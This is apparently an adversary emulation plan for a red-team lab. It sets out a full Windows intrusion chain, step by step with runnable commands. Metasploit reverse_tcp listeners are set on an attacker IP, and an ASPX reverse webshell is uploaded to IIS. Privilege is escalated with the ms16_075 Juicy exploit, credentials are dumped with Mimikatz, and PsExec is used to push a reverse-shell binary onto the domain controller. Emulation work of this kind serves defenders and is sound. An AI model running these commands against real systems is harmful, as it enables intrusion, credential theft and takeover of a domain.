# Scenario 1

## I. Preface
This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run.

|||
|-|-|
|`<user_admin>`| Username of local admin account |
|`<pass_admin>`| Username of local admin account |
|`<domain>`| Name of the domain |
|`<ip_attacker>`| IP of attacker's computer |
|`<ip_iis`| IP of IIS Server |
|`<name_ad>`| Name of AD Server |


## II. Contents

* [Step 0 - Setup](#step0)
* [Step 1 - Initial Access](#step1)
* [Step 2 - Privilege Escalation](#step2)
* [Step 3 - Credentials Dumping](#step3)
* [Step 4 - Domain Discovery](#step4)
* [Step 5 - Lateral Movement](#step5)

---

### Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 1 Infrastructure](./Infrastructure.md) documentation.

---

### Step 0 - Setup <a name="step0"></a>

#### 0 - Start C2 Server
On the `Attack Platform`:

1. `ctrl - alt - T` to open `Terminal 1`

2. Start listening on port `4444`
```
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <ip_attacker>;set lport 4444;run'
```

---

### Step 1 - Initial Access <a name="step1"></a>

The scenario begins when attacker successfully upload a reverse webshell `session.aspx` to the target's webserver. <br>
After opening the webshell, `Attack Platform` receives a connection from `IIS server`.

#### 1.A - Upload reverse shell

On the `Attack Platform`:

1. Open `<ip_iis>` on a web browser

2. Click `Browse...` and select `session.aspx` for uploading

3. Click `Send`

#### 1.B - Execute reverse shell

On the `Attack Platform`:

1. Open `<ip_iis>/session.aspx` on web browser

2. Now on `Terminal 1` there should be a meterpreter session

---

### Step 2  - Privilege Escalation <a name="step2"></a>

The attacker exploit `IIS server` using `Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)` vunerable to get `System` privilege

#### 2 - Obtain System shell
On the `Terminal 1` of `Attack Platform`:

1. Run these command on the meterpreter session obtained from the previous step
```
background
use exploit/windows/local/ms16_075_reflection_juicy
set TARGET 0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set SESSION 1
exploit

```

---

### Step 3  - Credentials Dumping <a name="step3"></a>

With a `System` shell in hand, attacker starts to collect credentials cached in memory using `Mimikatz`

#### 3.A - Load Mimikatz

On the `Terminal 1` of `Attack Platform`:

1.  Load mimikatz to memory
```
load kiwi
```

#### 3.B - Dump credentials

On the `Terminal 1` of `Attack Platform`:

1.  Dump all types of credentials including `msv`, `wdigest`, `kerberos`. Note that in this scenario
we focus on `wdigest` credentials
```
creds_all
```

2.  Collect `<user_admin>`, `<pass_admin>` and `<domain>` 

---

### Step 4 - Domain Discovery <a name="step4"></a>

The attacker use `nslookup` on `<domain>` to get the domain controller's name `<name_ad>`

#### 4 - Find domain controller's name

On the `Terminal 1` of `Attack Platform`:

1.  Switch from meterpreter session to cmd shell
```
shell
```

2.  Run `nslookup` command
```
nslookup <domain>
```

3.  Obtain the server's name on the first line

4.  Return to meterpreter session
```
exit
```

---

### Step 5 - Lateral Movement <a name="step5"></a>

The attacker now has `<name_ad>`, `<user_admin>` and `<pass_admin>`. They now can remote execute a reverse shell on `AD server` using `PsExec` with above credentials.

#### 5.A - Tools transfer

On the `Terminal 1` of `Attack Platform`:

1.  Upload `PsExec.exe` to `C:\Users\<user_admin>\AppData\Local\Temp`
```
upload /tmp/modules/PsExec.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\PsExec.exe
```

2.  Upload `session.exe` to `C:\Users\<user_admin>\AppData\Local\Temp`
```
upload /tmp/modules/session.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\session.exe
```

#### 5.B - Listen for another session

On the `Attack Platform`:

1. `ctrl - alt - T` to open `Terminal 2`

2. Start listening on port `4445`
```
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <ip_attacker>;set lport 4445;run'
```

#### 5.C - Remote Execute

On the `Terminal 1` of `Attack Platform`:

1.  Move to the tools's location
```
shell
cd C:\Users\<user_admin>\AppData\Local\Temp
```

2.  Run `PsExec.exe` to execute `session.exe` on `AD Server`
```
psexec.exe \\<name_ad> -i -h -u <user_admin> -p <pass_admin> -accepteula -d -c session.exe
```

3.  Now `Terminal 2` should receive a connection back from `AD Server` with local admin privilege

